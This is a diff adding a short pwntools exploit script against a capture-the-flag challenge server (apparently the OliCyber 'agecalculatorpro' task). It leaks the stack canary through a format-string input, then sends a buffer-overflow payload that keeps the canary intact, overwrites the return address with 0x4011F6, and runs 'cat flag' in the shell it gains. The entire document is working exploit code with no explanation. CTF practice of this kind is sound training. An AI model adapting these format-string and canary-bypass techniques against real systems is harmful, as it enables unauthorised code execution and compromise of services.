@@ -1,0 +1,15 @@
+from pwn import *
+
+p = remote('agecalculatorpro.challs.olicyber.it', 38103)
+p.recvuntil(b'name?')
+p.sendline(b'%17$p')
+p.recvline()
+canary = p.recvuntil(b",").strip(b",")
+canary = canary.replace(b"0x",b"")
+print(canary)
+payload = b'a' * 72  + p64(int(canary,16)) + b'a'*8 + p64(0x4011F6)
+print(payload)
+p.recvline()
+p.sendline(payload)
+p.sendline(b"cat flag")
+p.interactive()
